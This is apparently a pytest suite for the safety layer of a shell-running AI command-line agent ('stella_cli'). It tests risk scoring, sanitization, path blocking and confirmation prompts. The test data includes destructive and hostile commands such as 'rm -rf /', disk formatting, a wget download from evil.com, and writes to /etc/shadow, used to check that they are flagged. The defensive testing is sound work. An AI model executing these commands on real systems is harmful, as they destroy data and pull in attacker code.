import sys
import pytest
from unittest.mock import MagicMock, patch

# --- 1. SMART MOCKING SETUP ---

# We need a fake @tool decorator. 
# Without this, @tool turns your functions into MagicMocks, deleting their logic.
def fake_tool_decorator(func):
    """A pass-through decorator that keeps the original function logic."""
    def wrapper(*args, **kwargs):
        return func(*args, **kwargs)
    # We attach the original function to .func so existing tests (if any) using .func work
    wrapper.func = func 
    return wrapper

# Create a mock module for tools
mock_tools_module = MagicMock()
mock_tools_module.tool = fake_tool_decorator

# Apply Mocks
sys.modules["langchain_core"] = MagicMock()
sys.modules["langchain_core.tools"] = mock_tools_module # <--- Use our smart mock here
sys.modules["langchain_core.messages"] = MagicMock()
sys.modules["langchain_core.callbacks"] = MagicMock()
sys.modules["langchain"] = MagicMock()
sys.modules["langchain_ollama"] = MagicMock()
sys.modules["langchain.agents"] = MagicMock()
sys.modules["rich"] = MagicMock()
sys.modules["rich.console"] = MagicMock()
sys.modules["rich.markdown"] = MagicMock()
sys.modules["rich.theme"] = MagicMock()
sys.modules["rich.panel"] = MagicMock()
sys.modules["prompt_toolkit"] = MagicMock()
sys.modules["prompt_toolkit.history"] = MagicMock()
sys.modules["prompt_toolkit.formatted_text"] = MagicMock()

# Mock sys.argv to prevent argparse from failing
with patch.object(sys, 'argv', ['stella_cli.py']):
    import stella_cli

# --- 2. TEST SUITE ---

class TestSafetyLogic:
    
    # --- RISK ANALYSIS TESTS ---
    @pytest.mark.parametrize("command, expected_risk", [
        ("ls -la", "low"),
        ("echo 'hello world'", "low"),
        ("rm file.txt", "low"),       
        ("rm -rf /", "critical"),
        ("sudo reboot", "critical"),
        ("mkfs.ext4 /dev/sda", "critical"),      # This previously failed
        ("mkfs.vfat /dev/sdb", "critical"),      # New variant test
        ("wget http://evil.com/script.sh", "critical"),
        ("chmod 777 /etc/passwd", "critical"),
    ])
    def test_analyze_risk(self, command, expected_risk):
        assert stella_cli.analyze_risk(command) == expected_risk

    # --- COMMAND SANITIZATION TESTS ---
    def test_sanitize_curl_timeout(self):
        cmd = "curl https://example.com"
        assert "--max-time" in stella_cli.sanitize_command(cmd)

    def test_sanitize_systemctl_full(self):
        cmd = "systemctl status nginx"
        sanitized = stella_cli.sanitize_command(cmd)
        assert "-l" in sanitized or "--full" in sanitized

    # --- WRITE FILE RESTRICTIONS TESTS ---
    def test_write_file_blocked_directories(self):
        forbidden_paths = ["/etc/shadow", "/boot/config", "/usr/bin/malware"]
        for path in forbidden_paths:
            # Now we call the function directly (no .func needed, but wrapper handles it)
            result = stella_cli.write_file(path, "malicious data") 
            assert "forbidden" in result.lower() or "error" in result.lower()

    def test_write_file_allowed_directories(self, tmp_path):
        safe_path = tmp_path / "safe.txt"
        result = stella_cli.write_file(str(safe_path), "safe data")
        assert "Success" in result
        assert safe_path.read_text() == "safe data"

    # --- INTERACTIVE TOOL BLOCKING TESTS ---
    def test_interactive_tools_blocked(self):
        interactive_cmds = ["vim /tmp/test", "htop", "telnet 1.1.1.1"]
        
        for cmd in interactive_cmds:
            with patch("subprocess.run") as mock_run:
                with patch("builtins.input", return_value="y"): 
                     result = stella_cli.run_linux_command(cmd)
                
                assert "blocked" in result.lower() or "error" in result.lower()
                mock_run.assert_not_called()

# --- FILE READING TESTS ---
    def test_read_file_size_limit(self, tmp_path):
        """Ensure files larger than 5MB are rejected."""
        large_file = tmp_path / "large.log"
        large_file.write_text("dummy content")
        
        # Mock getsize to pretend the file is 6MB (6,000,000 bytes)
        with patch("os.path.getsize", return_value=6_000_000):
            # We must force DEBUG=False because debug mode bypasses size limits
            with patch("stella_cli.DEBUG", False): 
                result = stella_cli.read_file(str(large_file))
                assert "too large" in result.lower()

    def test_read_file_success(self, tmp_path):
        """Ensure normal files are read correctly."""
        normal_file = tmp_path / "normal.txt"
        normal_file.write_text("Hello World")
        
        result = stella_cli.read_file(str(normal_file))
        assert "Hello World" in result

    # --- TRUNCATION TESTS ---
    def test_truncate_output(self):
        """Ensure long output is truncated to Head...Tail."""
        # Create a string longer than CTX_LENGTH * 3 (assuming default 4096 * 3 = 12288)
        # We'll use a smaller mock CTX_LENGTH for testing to be safe/fast
        with patch("stella_cli.CTX_LENGTH", 10):
             with patch("stella_cli.DEBUG", False):
                long_text = "A" * 100
                truncated = stella_cli.truncate_output(long_text)
                
                assert "TRUNCATED" in truncated
                assert len(truncated) < 100
                # Should keep start and end
                assert truncated.startswith("AAAAAAAA") 
                assert truncated.endswith("AAAAAAAA")

    # --- REMOTE SSH TESTS ---
    def test_remote_command_structure(self):
        """Ensure SSH commands include timeouts and env vars."""
        with patch("subprocess.run") as mock_run:
            # Mock input to auto-accept the confirmation
            with patch("builtins.input", return_value="y"):
                stella_cli.run_remote_command("uptime", "192.168.1.50")
            
            # Get the actual command sent to subprocess
            called_args = mock_run.call_args[0][0]
            
            # Check for critical SSH flags
            assert "ssh" in called_args
            assert "-o ConnectTimeout=" in called_args
            assert "-o BatchMode=yes" in called_args
            # Check for Environment Injection
            assert "export PAGER=cat" in called_args

    # --- USER CONFIRMATION TESTS ---
    def test_user_abort_on_critical(self):
        """Ensure choosing 'n' raises UserAbort for critical commands."""
        with patch("builtins.input", return_value="n"):
            with pytest.raises(stella_cli.UserAbort):
                stella_cli.run_linux_command("sudo reboot")
